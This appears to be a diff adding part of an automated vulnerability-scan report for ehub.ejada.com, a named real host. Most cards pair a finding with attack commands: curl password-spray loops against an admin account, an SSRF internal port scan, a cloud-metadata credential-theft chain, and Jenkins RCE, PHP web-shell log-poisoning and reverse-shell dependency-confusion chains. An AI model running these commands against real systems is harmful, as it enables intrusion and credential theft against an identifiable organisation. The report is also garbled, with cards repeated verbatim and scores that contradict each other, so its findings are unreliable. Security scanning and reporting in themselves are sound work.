+  → SMB             ports [445, 139] : Pass-the-hash, lateral tool execution
+  → WinRM           ports [5985, 5986] : Invoke-Command / Evil-WinRM with stolen creds
+  → MySQL           ports [3306] : Credential reuse from leaked .env/config
+  → PostgreSQL      ports [5432] : Credential</code></pre>
+    <b>PoC (curl):</b><pre><code># Internal port scan via SSRF (interactsh):
+for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
+  curl -sk &#x27;https://ehub.ejada.com/?url=http://10.0.0.1:$port/&#x27; 2&gt;&amp;1 |   grep -v &#x27;refused\|timed&#x27; &amp;&amp; echo &quot;OPEN: $port&quot;
+done</code></pre>
+    <div class="fix">Fix: Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>LATERAL-MOVE-MAP-001</b> — Lateral Movement Attack Path Map
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-284 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Lateral Movement</div>
+    <p>Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. Internal scan pivots once initial RCE/SSRF is confirmed.</p>
+    <b>Evidence:</b><pre><code>Target IP: 34.111.193.103
+Network: 34.111.193.0/24
+
+Pivot Paths:
+  → SSH             ports [22] : Stolen SSH key / password spraying
+  → RDP             ports [3389, 3390] : Pass-the-hash via NTLM, credential reuse
+  → SMB             ports [445, 139] : Pass-the-hash, lateral tool execution
+  → WinRM           ports [5985, 5986] : Invoke-Command / Evil-WinRM with stolen creds
+  → MySQL           ports [3306] : Credential reuse from leaked .env/config
+  → PostgreSQL      ports [5432] : Credential</code></pre>
+    <b>PoC (curl):</b><pre><code># Internal port scan via SSRF (interactsh):
+for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
+  curl -sk &#x27;https://ehub.ejada.com/?url=http://10.0.0.1:$port/&#x27; 2&gt;&amp;1 |   grep -v &#x27;refused\|timed&#x27; &amp;&amp; echo &quot;OPEN: $port&quot;
+done</code></pre>
+    <div class="fix">Fix: Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>LATERAL-MOVE-MAP-001</b> — Lateral Movement Attack Path Map
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-284 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Lateral Movement</div>
+    <p>Lateral movement paths from ehub.ejada.com to adjacent systems. Network segment: 34.111.193.0/24. Internal scan pivots once initial RCE/SSRF is confirmed.</p>
+    <b>Evidence:</b><pre><code>Target IP: 34.111.193.103
+Network: 34.111.193.0/24
+
+Pivot Paths:
+  → SSH             ports [22] : Stolen SSH key / password spraying
+  → RDP             ports [3389, 3390] : Pass-the-hash via NTLM, credential reuse
+  → SMB             ports [445, 139] : Pass-the-hash, lateral tool execution
+  → WinRM           ports [5985, 5986] : Invoke-Command / Evil-WinRM with stolen creds
+  → MySQL           ports [3306] : Credential reuse from leaked .env/config
+  → PostgreSQL      ports [5432] : Credential</code></pre>
+    <b>PoC (curl):</b><pre><code># Internal port scan via SSRF (interactsh):
+for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
+  curl -sk &#x27;https://ehub.ejada.com/?url=http://10.0.0.1:$port/&#x27; 2&gt;&amp;1 |   grep -v &#x27;refused\|timed&#x27; &amp;&amp; echo &quot;OPEN: $port&quot;
+done</code></pre>
+    <div class="fix">Fix: Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>SCORECARD-001</b> — Attack Surface Scorecard — Risk Score 909/500 (100%) — CRITICAL
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 0.0 &nbsp;|&nbsp; Risk Scorecard</div>
+    <p>Attack Surface Scorecard — ehub.ejada.com
+══════════════════════════════════════════════════
+Risk Score    : 909 / 500 (100%)
+Risk Band     : CRITICAL — Immediate remediation required
+
+Finding Distribution:
+  CRITICAL   :   19 ███████████████████
+  HIGH       :   27 ███████████████████████████
+  MEDIUM     :   41 ████████████████████████████████████████
+  LOW        :    0 
+  INFO       :   18 ██████████████████
+
+Top Attack Categories:
+  Information Disclosure                   : 26
+  Auth / Credential Stuffing               : 22
+  SSRF → Cloud Pivot                       : 10
+  SSRF                                     : 7
+  Subdomain Takeover                       : 7
+  Exploit Chain                            : 7
+  GraphQL                                  : 4
+  Lateral Movement                         : 4
+  Log4Shell / Java RCE                     : 3
+  RCE                                      : 2
+
+Remediation Priority Matrix:
+  Priority 1 (Immediate): All CRITICAL findings
+  Priority 2 (7 days):    All HIGH findings
+  Priority 3 (30 days):   All MEDIUM findings
+  Priority 4 (90 days):   All LOW findings</p>
+    <b>Evidence:</b><pre><code>Total findings: 105 | Weighted score: 909/500</code></pre>
+    <b>PoC (curl):</b><pre><code># This is a summary scorecard — see individual findings for PoC commands</code></pre>
+    <div class="fix">Fix: Use this scorecard to prioritise remediation. Share with development team and security leadership. Re-scan after fixes to verify remediation effectiveness.</div>
+  </div>
+</div>
+<div class="card" data-sev="CRITICAL">
+  <div class="card-hdr" style="border-left:4px solid #dc3545">
+    <span class="badge" style="background:#dc3545">CRITICAL</span>
+    <b>CLOUD-META-PIVOT-CHAIN-001</b> — Cloud Metadata Pivot Chain — Built from 17 SSRF finding(s)
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-918 &nbsp;|&nbsp; CVSS: 9.9 &nbsp;|&nbsp; SSRF → Cloud Pivot</div>
+    <p>Complete cloud metadata pivot chains generated from 17 confirmed/suspected SSRF finding(s). Each chain shows exact steps from SSRF to full cloud account takeover.</p>
+    <b>Evidence:</b><pre><code>SSRF source: F-BSSRF-001 — Blind SSRF Attack Surface — OOB Payloads Generated
+SSRF source: SSRF-META-PROBE — Cloud metadata SSRF payloads generated (manual verification 
+SSRF source: SSRF-BYPASS-POC — SSRF URL parser bypass payloads generated — manual verificat
+
+[AWS Pivot Chain]
+  1. http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  2. Extract role name from response
+  3. http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE}
+  4. Extract AccessKeyId, SecretAc</code></pre>
+    <b>PoC (curl):</b><pre><code># See chain steps above — replace SSRF parameter with metadata URLs</code></pre>
+    <div class="fix">Fix: Block all cloud IMDS IPs at egress layer. Enforce IMDSv2 (AWS). Restrict service account permissions. Apply Workload Identity (GCP). Use managed identity with least privilege (Azure).</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>F-HDR-001</b> — Critical Security Headers Missing
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 5.4 &nbsp;|&nbsp; Security Headers</div>
+    <p>Header score 0/100 — multiple critical headers absent.</p>
+    <b>Evidence:</b><pre><code>{
+  &quot;strict-transport-security&quot;: &quot;MISSING&quot;,
+  &quot;content-security-policy&quot;: &quot;MISSING&quot;,
+  &quot;x-content-type-options&quot;: &quot;MISSING&quot;,
+  &quot;x-frame-options&quot;: &quot;MISSING&quot;,
+  &quot;referrer-policy&quot;: &quot;MISSING&quot;,
+  &quot;permissions-policy&quot;: &quot;MISSING&quot;,
+  &quot;x-xss-protection&quot;: &quot;MISSING&quot;,
+  &quot;cache-control&quot;: &quot;MISSING&quot;,
+  &quot;cross-origin-opener-policy&quot;: &quot;MISSING&quot;,
+  &quot;cross-origin-resource-policy&quot;: &quot;MISSING&quot;
+}</code></pre>
+    <b>PoC (curl):</b><pre><code>curl -sI &#x27;https://ehub.ejada.com/&#x27;</code></pre>
+    <div class="fix">Fix: Implement HSTS, CSP, X-Frame-Options, X-Content-Type-Options.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CHAIN-JENKINS-RCE</b> — [EXPLOIT CHAIN] Jenkins Groovy RCE → Lateral Movement
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 10.0 &nbsp;|&nbsp; Exploit Chain</div>
+    <p>[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Jenkins Groovy RCE → Lateral Movement
+
+Attack steps:
+1. Access Jenkins /script endpoint (unauthenticated or weak creds)
+2. Execute Groovy: println &#x27;id&#x27;.execute().text
+3. Read /var/jenkins_home/credentials.xml for stored secrets
+4. Extract SSH keys, API tokens, cloud credentials from Jenkins vaults
+5. Use credentials to pivot to connected systems (GitHub, AWS, GCP)
+6. Establish reverse shell / C2 beacon for persistence
+
+Impact: Full server RCE, credential harvest, lateral movement to all connected systems</p>
+    <b>Evidence:</b><pre><code>Applicable to target: False | CVSS: 10.0</code></pre>
+    <b>PoC (curl):</b><pre><code># See attack steps above — each step must be verified manually</code></pre>
+    <div class="fix">Fix: Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CHAIN-LFI-RCE</b> — [EXPLOIT CHAIN] LFI → Log Poison → RCE
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 9.8 &nbsp;|&nbsp; Exploit Chain</div>
+    <p>[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: LFI → Log Poison → RCE
+
+Attack steps:
+1. Confirm LFI via ?page=../../../../etc/passwd
+2. Include PHP interpreter via ?page=php://filter/convert.base64-encode/resource=index
+3. Poison Apache/Nginx access log: curl -A &#x27;&lt;?php system($_GET[cmd]); ?&gt;&#x27; target
+4. Include log file via LFI: ?page=../../../../var/log/apache2/access.log
+5. Execute commands: ?page=...access.log&amp;cmd=id
+6. Upgrade to reverse shell, establish persistence
+
+Impact: OS-level RCE, full server compromise, data exfiltration</p>
+    <b>Evidence:</b><pre><code>Applicable to target: False | CVSS: 9.8</code></pre>
+    <b>PoC (curl):</b><pre><code># See attack steps above — each step must be verified manually</code></pre>
+    <div class="fix">Fix: Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CHAIN-AUTH-BYPASS-ADMIN</b> — [EXPLOIT CHAIN] Auth Bypass → Admin Takeover → Data Exfil
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 9.6 &nbsp;|&nbsp; Exploit Chain</div>
+    <p>[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Auth Bypass → Admin Takeover → Data Exfil
+
+Attack steps:
+1. Identify auth bypass via SQLi, JWT none-alg, or IDOR on /api/admin
+2. Access admin panel without valid credentials
+3. Create new admin account or reset existing admin password
+4. Access all user data, PII, financial records via admin API
+5. Export database via admin data-export function
+6. Modify user records / financial transactions
+
+Impact: Complete admin takeover, PII breach, financial fraud</p>
+    <b>Evidence:</b><pre><code>Applicable to target: False | CVSS: 9.6</code></pre>
+    <b>PoC (curl):</b><pre><code># See attack steps above — each step must be verified manually</code></pre>
+    <div class="fix">Fix: Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CHAIN-SUPPLY-CHAIN-SAST</b> — [EXPLOIT CHAIN] Supply Chain → Internal Package Confusion → RCE
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-693 &nbsp;|&nbsp; CVSS: 9.3 &nbsp;|&nbsp; Exploit Chain</div>
+    <p>[THEORETICAL — VERIFY PREREQUISITES] Complete exploit narrative: Supply Chain → Internal Package Confusion → RCE
+
+Attack steps:
+1. Extract internal package names from exposed package.json / requirements.txt
+2. Register same package names on public npm/PyPI with higher version
+3. Wait for CI/CD pipeline to install public version during build
+4. Malicious package executes postinstall/setup.py with reverse shell
+5. Access CI/CD secrets, source code, and production deployment credentials
+6. Pivot to production environment
+
+Impact: Supply chain compromise, CI/CD takeover, production deployment control</p>
+    <b>Evidence:</b><pre><code>Applicable to target: False | CVSS: 9.3</code></pre>
+    <b>PoC (curl):</b><pre><code># See attack steps above — each step must be verified manually</code></pre>
+    <div class="fix">Fix: Address all prerequisite vulnerabilities. Implement defence-in-depth: WAF, egress filtering, least privilege, network segmentation, SIEM alerting.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-LOGIN</b> — Credential Stuffing Surface — No Rate Limit at /login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/login&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_AUTH</b> — Credential Stuffing Surface — No Rate Limit at /api/auth
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/auth&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_V1_LOGIN</b> — Credential Stuffing Surface — No Rate Limit at /api/v1/login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/v1/login&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_V2_AUTH</b> — Credential Stuffing Surface — No Rate Limit at /api/v2/auth
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/v2/auth&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_SIGNIN</b> — Credential Stuffing Surface — No Rate Limit at /api/signin
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/signin&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-AUTH_TOKEN</b> — Credential Stuffing Surface — No Rate Limit at /auth/token
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /auth/token has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/auth/token&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_SESSIONS</b> — Credential Stuffing Surface — No Rate Limit at /api/sessions
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/sessions has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/sessions&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_LOGIN</b> — Credential Stuffing Surface — No Rate Limit at /api/login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/login&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_AUTH</b> — Credential Stuffing Surface — No Rate Limit at /api/auth
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/auth&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_V1_LOGIN</b> — Credential Stuffing Surface — No Rate Limit at /api/v1/login
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/v1/login has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/v1/login&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_V2_AUTH</b> — Credential Stuffing Surface — No Rate Limit at /api/v2/auth
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/v2/auth has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/v2/auth&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-API_SIGNIN</b> — Credential Stuffing Surface — No Rate Limit at /api/signin
+  </div>
+  <div class="card-body">
+    <div class="meta">CWE: CWE-307 &nbsp;|&nbsp; CVSS: 7.5 &nbsp;|&nbsp; Auth / Credential Stuffing</div>
+    <p>Auth endpoint /api/signin has no apparent rate limiting or lockout. Credential stuffing surface: 10 common passwords × all leaked credential pairs can be tested rapidly.</p>
+    <b>Evidence:</b><pre><code>HTTP 403 | Rate-limited: False | Lockout: False</code></pre>
+    <b>PoC (curl):</b><pre><code># Password spray (authorized testing only):
+for pass in Password1! Welcome1! Summer2024!; do
+  curl -sk -X POST &#x27;https://ehub.ejada.com/api/signin&#x27;   -H &#x27;Content-Type: application/json&#x27;   -d &#x27;{&quot;email&quot;:&quot;admin@ejada.com&quot;,&quot;password&quot;:&quot;$pass&quot;}&#x27; |   grep -v &#x27;invalid\|error&#x27;; done</code></pre>
+    <div class="fix">Fix: Implement rate limiting (5 attempts / 15 min per IP and per account). Add CAPTCHA after 3 failures. Enable account lockout. Implement breached credential detection (HaveIBeenPwned API). Use CAPTCHA on all auth flows.</div>
+  </div>
+</div>
+<div class="card" data-sev="HIGH">
+  <div class="card-hdr" style="border-left:4px solid #fd7e14">
+    <span class="badge" style="background:#fd7e14">HIGH</span>
+    <b>CREDSTUFF-AUTH_TOKEN</b> — Credential Stuffing Surface — No Rate Limit at /auth/token
+  </div>
+  <div class="card-body">
